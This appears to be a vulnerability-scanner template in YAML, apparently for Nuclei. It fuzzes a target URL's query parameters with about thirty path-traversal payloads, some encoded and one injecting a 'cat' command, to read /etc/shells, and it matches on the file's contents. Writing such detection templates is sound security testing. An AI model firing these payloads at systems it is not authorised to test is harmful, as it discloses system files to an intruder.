http:
- fuzzing:
  - fuzz:
    - '{{nix_fuzz}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '# valid login shells'
    - /bin/sh
    - /bin/ash
    - /bin/bash
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    nix_fuzz:
    - '%00../../../../../../etc/shells'
    - '%00/etc/shells%00'
    - '%0a/bin/cat%20/etc/shells'
    - '%252e%252e%252fetc%252fshells%00'
    - '%252e%252e%252fetc%252fshells'
    - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells%00'
    - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/shells'
    - '....//....//etc/shells'
    - ../../../../../../../../../../../../etc/shells%00
    - ../../../../../../../../../../../../etc/shells
    - ../../../../../../../../../etc/shells
    - ../../../../../../../../etc/shells
    - ../../../../../../../etc/shells
    - ../../../../../../etc/shells
    - ../../../../../etc/shells
    - ../../../../etc/shells
    - ../../../etc/shells%00
    - ../../../etc/shells
    - ../../etc/shells
    - ..///////..////..//////etc/shells
    - ..\..\..\..\..\..\..\..\..\..\etc\shells%00
    - ..\..\..\..\..\..\..\..\..\..\etc\shells
    - .\\./.\\./.\\./.\\./.\\./.\\./etc/shells
    - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells
    - /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/shells
    - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shells
    - /../../../../../../../../../../../etc/shells%00.html
    - /../../../../../../../../../../../etc/shells%00.jpg
    - /../../../../../../../../../../etc/shells
    - /../../../../../../../../../../etc/shells^^
    - /../../../../etc/shells
    - /..\../..\../..\../..\../..\../..\../etc/shells
    - /./././././././././././etc/shells
    - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells
